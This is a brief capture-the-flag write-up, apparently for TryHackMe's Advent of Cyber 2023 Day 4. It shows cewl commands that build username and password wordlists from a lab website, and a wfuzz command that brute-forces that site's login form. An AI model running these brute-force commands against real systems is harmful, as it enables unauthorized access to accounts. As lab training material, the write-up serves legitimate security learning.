# Day 4
## Website used to spider and create ordlist
![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/36433fac-524e-42ab-aeb0-c9a3d0d712c0)

## cewl
![image](https://github.com/PolGs/THM-Advent-of-Cyber-2023/assets/19478700/344dce6d-d5e3-4e51-b2f9-2f68bbf2dc2b)
generating username and password lists
```s
cewl -d 2 -m 5 -w passwords.txt http://10.10.50.197 --with-numbers
```
```s
cewl -d 0 -m 5 -w usernames.txt http://10.10.50.197/team.php --lowercase
```
## Cracking with wfuzz
```s
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.50.197/login.php -d "username=FUZZ&password=FUZ2Z"
```







